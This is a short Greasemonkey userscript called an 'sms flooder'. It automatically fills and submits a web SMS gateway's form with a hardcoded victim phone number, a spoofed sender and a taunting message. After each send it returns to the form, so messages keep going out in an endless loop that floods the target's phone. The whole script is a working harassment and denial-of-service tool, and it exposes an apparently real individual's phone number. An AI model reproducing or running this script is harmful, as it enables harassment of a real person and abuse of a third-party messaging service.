// ==UserScript==
// @name            pak sms flooder
// @namespace      nandu's flooder :D
// @description    floods pak number
// @include       http://www.syk.be/*
// ==/UserScript==

var victim="918059022566";//
var sender="918059022566";
var smstext="flooo00000000000d :P";
var name="hmmmm.....";
if(document.location=="http://www.syk.be/sms/")
{
document.forms[0].elements[0].value=name;

document.forms[0].elements[1].value=sender;

document.forms[0].elements[2].value=victim;

document.forms[0].elements[3].value=smstext;

document.forms[0].elements[4].click();

}
if(document.location=="http://www.syk.be/sent.php")
{
document.location="http://www.syk.be/sms/";
}